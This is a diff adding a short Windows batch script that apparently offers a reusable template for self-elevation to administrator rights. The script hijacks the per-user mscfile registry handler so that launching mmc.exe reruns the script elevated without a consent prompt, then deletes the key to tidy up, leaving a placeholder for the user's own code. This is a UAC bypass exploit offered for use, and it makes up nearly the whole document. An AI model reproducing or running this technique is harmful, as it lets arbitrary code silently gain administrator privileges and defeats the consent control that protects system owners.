@@ -1,0 +1,31 @@
+@echo off
+:: SELF ELEVATING USING MMC
+
+:: also very old, wont work on newer
+
+net session >nul 2>&1
+if %errorlevel% == 0 (
+    echo.
+    echo ============================================
+    echo   This CMD is running with Administrator permissions.
+    echo ============================================
+    echo.
+    pause
+    goto main
+)
+
+echo [INFO] Attempting mmc elevation...
+
+:: mmc / mscfile Bypass
+reg add "HKCU\Software\Classes\mscfile\Shell\Open\command" /ve /t REG_SZ /d "\"%~f0\" %*" /f >nul 2>&1
+
+start "" "%SystemRoot%\System32\mmc.exe" >nul 2>&1
+timeout /t 2 >nul 2>&1
+reg delete "HKCU\Software\Classes\mscfile" /f >nul 2>&1
+
+echo [INFO] Relaunching with admin rights...
+exit /b
+
+:main
+:: your code goes here
+pause
